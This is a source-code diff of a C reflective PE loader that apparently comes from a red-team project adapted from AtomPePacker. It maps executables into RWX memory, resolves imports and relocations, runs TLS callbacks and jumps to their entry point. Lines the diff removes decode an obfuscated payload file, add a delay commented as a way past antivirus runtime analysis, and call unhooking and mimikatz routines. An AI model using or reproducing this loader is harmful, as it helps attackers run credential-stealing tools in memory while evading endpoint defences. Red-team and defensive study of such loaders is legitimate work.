@@ -1,15 +1,9 @@
 //https://github.com/NUL0x4C/AtomPePacker
 #include "header.h"
-//#include "minidumpapiset.h"
-
-
 #pragma comment (lib, "Dbghelp.lib")
 #pragma comment (lib, "ntdll.lib")
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "Version.lib")
-
-
-
 
 BOOL _InitPeStruct(PInPeConfig _Pe, PVOID pPeAddress, SIZE_T sPeSize) {
 	if (pPeAddress == NULL || sPeSize == NULL) {
@@ -22,31 +16,49 @@ BOOL _InitPeStruct(PInPeConfig _Pe, PVOID pPeAddress, SIZE_T sPeSize) {
 		return FALSE;
 	}
 
-	
-
-
 	_Pe->pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pPeAddress + _Pe->pDosHdr->e_lfanew);
 	if (_Pe->pNtHdr->Signature != IMAGE_NT_SIGNATURE) {
 		return FALSE;
 	}
+
 	_Pe->pEIDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+	
 	_Pe->pTLSDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+
+
+
 	_Pe->pEBDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 	_Pe->pEHDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
 	_Pe->pSecHdr = (PIMAGE_SECTION_HEADER)((SIZE_T)_Pe->pNtHdr + sizeof(IMAGE_NT_HEADERS));
-	printf("BASE : %p\n", _Pe->pPeAddress);
-	printf("Addr sec : %p\n", _Pe->pSecHdr);
-	printf("Addr sec : %p\n", &_Pe->pSecHdr[6]);
-	for (int i = 0; i < _Pe->pNtHdr->FileHeader.NumberOfSections; ++i) {
-		printf("Section %d. PointerToRawData=%p. size=%d\n", i, _Pe->pSecHdr[i].PointerToRawData, _Pe->pSecHdr[i].SizeOfRawData);
-	}
 	if (_Pe->pDosHdr == NULL || _Pe->pNtHdr == NULL ||
 		_Pe->pEIDataDir == NULL || _Pe->pTLSDataDir == NULL || _Pe->pEBDataDir == NULL || _Pe->pEHDataDir == NULL ||
 		_Pe->pSecHdr == NULL
 		) {
 		return FALSE;
 	}
+	if (_Pe->pTLSDataDir->VirtualAddress != 0) {
+		//printf("FATAL This program has TLS. This is not handled yet. ");
+		//exit(100);
+	}
 	return TRUE;
+}
+
+BOOL dotls(InPeConfig _Pe, ULONG_PTR pPeAddress) {
+	if (_Pe.pTLSDataDir->VirtualAddress == 0) {
+		// No TLS, so we can return early
+		return TRUE;
+	}
+	PIMAGE_TLS_DIRECTORY64 tls = (PIMAGE_TLS_DIRECTORY64)(pPeAddress + _Pe.pTLSDataDir->VirtualAddress);
+	PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)(tls->AddressOfCallBacks);
+	if (callback) {
+		while (*callback) {
+			(*callback)(pPeAddress, DLL_PROCESS_ATTACH, NULL);
+			callback++;
+		}
+	}
+	printf("TLS OK\n");
+	return TRUE;
+
 }
 
 BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress) {
@@ -69,6 +81,7 @@ BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress) {
 		if (Next == NULL) {
 			Next = pImgDes->FirstThunk;
 		}
+		int nb_function = 0;
 		while (TRUE) {
 			PIMAGE_THUNK_DATA			_1stThunk = (IMAGE_THUNK_DATA*)(pPeAddress + HeadSize + Head);
 			PIMAGE_THUNK_DATA			Orig1stThunk = (IMAGE_THUNK_DATA*)(pPeAddress + NextSize + Next);
@@ -78,6 +91,7 @@ BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress) {
 				break;
 			}
 			if (Orig1stThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
+				printf("HAS ORDINAL in %s\n", DllName);
 				PIMAGE_DOS_HEADER		_dos;
 				PIMAGE_NT_HEADERS		_nt;
 				PIMAGE_EXPORT_DIRECTORY	_ExportDir;
@@ -86,14 +100,16 @@ BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress) {
 				_dos = (PIMAGE_DOS_HEADER)hModule;
 				_nt = (PIMAGE_NT_HEADERS)(((ULONG_PTR)hModule) + _dos->e_lfanew);
 				_ExportDir = (PIMAGE_EXPORT_DIRECTORY)(((ULONG_PTR)hModule) + _nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+				
+				
 				_FuncAddArray = (PDWORD)((ULONG_PTR)hModule + _ExportDir->AddressOfFunctions);
 
 				pFunction = ((ULONG_PTR)hModule + _FuncAddArray[Orig1stThunk->u1.Ordinal]);
-				printf("Ordinal\n");
 			}
 			else {
 				FuncName = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)pPeAddress + Orig1stThunk->u1.AddressOfData);
 				pFunction = (ULONG_PTR)GetProcAddress(hModule, FuncName->Name);
+				//printf("By functionname %s\n", FuncName);
 			}
 			if (pFunction == NULL) {
 				return FALSE;
@@ -101,18 +117,24 @@ BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress) {
 			_1stThunk->u1.Function = (ULONGLONG)pFunction;
 			HeadSize += sizeof(IMAGE_THUNK_DATA);
 			NextSize += sizeof(IMAGE_THUNK_DATA);
+			nb_function++;
 		}
+		printf("DONE\n");
 	}
 	return TRUE;
 }
 
-BOOL _ReallocationSupport(ULONG_PTR ActualAddress, ULONG_PTR PreferableAddress, PIMAGE_BASE_RELOCATION BaseRelocDir) {
+BOOL _ReallocationSupport(ULONG_PTR ActualAddress, ULONG_PTR PreferableAddress, PIMAGE_BASE_RELOCATION BaseRelocDir, DWORD size) {
 	PIMAGE_BASE_RELOCATION  pImageBR = BaseRelocDir;
 	ULONG_PTR				OffsetIB = ActualAddress - PreferableAddress;
 	PBASE_RELOCATION_ENTRY	Reloc = NULL;
 	
-	while (pImageBR->VirtualAddress != 0) {
+	
+	while (size > 0) {
 		Reloc = (PBASE_RELOCATION_ENTRY)(pImageBR + 1);
+		size -= pImageBR->SizeOfBlock;
+
+		int num = 1;
 		
 		while ((PBYTE)Reloc != (PBYTE)pImageBR + pImageBR->SizeOfBlock) {
 			switch (Reloc->Type) {
@@ -146,32 +168,45 @@ PVOID UnpackAndRunEp(PVOID pPeAddress, SIZE_T sPeSize, BOOL RunPe) {
 	InPeConfig				_Pe1 = { 0 };
 	ULONG_PTR				pAddress = NULL;
 	if (!_InitPeStruct(&_Pe1, pPeAddress, sPeSize)) {
+		exit(5);
 		return;
 	}
+	
+
+
 	pAddress = (unsigned char*)VirtualAlloc(NULL, _Pe1.pNtHdr->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (pAddress == NULL) {
+		exit(4);
 		return;
 	}
+	
 	
 	memcpy(pAddress, pPeAddress, _Pe1.pNtHdr->OptionalHeader.SizeOfHeaders);	
 
 
-	
 	for (int i = 0; i < _Pe1.pNtHdr->FileHeader.NumberOfSections; i++) {
 		memcpy(pAddress + _Pe1.pSecHdr[i].VirtualAddress, (ULONG_PTR)pPeAddress + _Pe1.pSecHdr[i].PointerToRawData, _Pe1.pSecHdr[i].SizeOfRawData);
 	}
 	
 	if (!_FixImportAddressTable(_Pe1, pAddress)) {
+		exit(6);
 		return;
 	}
 	
-	if (pAddress != _Pe1.pNtHdr->OptionalHeader.ImageBase) {
-		if (!_ReallocationSupport(pAddress, _Pe1.pNtHdr->OptionalHeader.ImageBase, (PIMAGE_BASE_RELOCATION)(pAddress + _Pe1.pEBDataDir->VirtualAddress))) {
+	if (pAddress != _Pe1.pNtHdr->OptionalHeader.ImageBase && _Pe1.pEBDataDir->VirtualAddress != 0) {
+		if (!_ReallocationSupport(pAddress, _Pe1.pNtHdr->OptionalHeader.ImageBase, (PIMAGE_BASE_RELOCATION)(pAddress + _Pe1.pEBDataDir->VirtualAddress), _Pe1.pEBDataDir->Size)) {
+			exit(7);
 			return;
 		}
 	}
+	//fix_peb(pAddress + _Pe1.pNtHdr->OptionalHeader.AddressOfEntryPoint);
+	//dotls(_Pe1, pAddress);
 	
 	PVOID EP = (PVOID)(pAddress + _Pe1.pNtHdr->OptionalHeader.AddressOfEntryPoint);
+	//_PPEB peb;
+
+	//void* ptr32 = __readfsdword(0x30);
+	void* ptr64 = __readgsdword(0x60);
 
 	return EP;
 	
@@ -198,45 +233,58 @@ unsigned char* get_file(unsigned char* filename, size_t* ret_size) {
 	return pe_mem;
 }
 
+/*void fix_peb(PVOID baseaddr) {
+	PPEBOVERRIDE peb = (PPEBOVERRIDE)__readgsqword(0x60);
+	RtlEnterCriticalSection(peb->FastPebLock);
+	peb->ImageBaseAddress = baseaddr;
+	RtlLeaveCriticalSection(peb->FastPebLock);
+}*/
 
 
-/*********************************************************************************************************************/
 
 
 
-
-
-// exemple: mimikatz
 int main(int argc, char *argv[]) {
-	printf("Start 10s\n");
-	//Sleep(10000);//if AV kill it at this stage, it perform static analysis on runtime
 
-		//create_box();
+
 		size_t len;
-		//unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\testrt\\REDTEAM_PE_Reflective\\x64\\Release\\simplelist.exe",&len);
-		
-		//unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len);
-		
-		
-		unsigned char* raw = get_file("C:\\Users\\seb\\GIT\\REDTEAM_PE_Reflective\\x64\\Release\\Custom.txt", &len);
-		//unsigned char *raw = get_file("C:\\Users\\sebastien.carre\\whitelist\\GIT\\REDTEAM_PE_Reflective\\x64\\Release\\Custom.txt",&len);
-
-		for (size_t i = 0; i < len; ++i) {
-			raw[i] = raw[i] - 1;
-		}
-		 
-		 
 		
 
+		//protected process: cannot be removed or a copy is not executed
+		//unsigned char* raw = get_file("C:\\Windows\\System32\\ping.exe", &len);
+		//unsigned char* raw = get_file("C:\\Windows\\System32\\tracert.exe", &len);
+
+
+		// OK
+		//unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len); // no ordinal, no TLS
+		//unsigned char* raw = get_file("C:\\Windows\\System32\\tar.exe", &len); // no ordinal, no TLS
+		//unsigned char* raw = get_file("C:\\Windows\\System32\\xcopy.exe", &len); // no ordinal, no TLS
+		//unsigned char* raw = get_file("C:\\Windows\\System32\\print.exe", &len); // no ordinal, no TLS
+		unsigned char* raw = get_file(argv[1], &len); // no ordinal, no TLS
+
+
+		//unsigned char* raw = get_file("C:\\Windows\\System32\\timeout.exe", &len); 	
+		//unsigned char* raw = get_file("C:\\Windows\\regedit.exe", &len);
+		//unsigned char* raw = get_file("C:\\Program Files\\NTCore\\Explorer Suite\\CFF Explorer.exe", &len);
+		
+
+
+
+		// TLS
+		//unsigned char* raw = get_file("C:\\Windows\\explorer.exe", &len);
+		//unsigned char* raw = get_file("C:\\Windows\\notepad.exe", &len);
+		//unsigned char* raw = get_file("C:\\Windows\\System32\\whoami.exe", &len);
+		//unsigned char* raw = get_file("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", &len);
+
+	
 		PVOID EP = UnpackAndRunEp(raw, len, TRUE);
-		main_unhook(0,NULL);
-#if 1
-		((VOID(*)())EP)();
-		//main_mimikatz(0, NULL);
 
-#endif
+		//HANDLE hThread = CreateThread(NULL, 0, EP, NULL, 0,NULL);
+
+		//WaitForSingleObject(hThread, INFINITE);
+
+		((VOID(*)())EP)();
 		printf("Press any key to continue");
 		getchar();
-	
-	return 0;
+		return 0;
 }
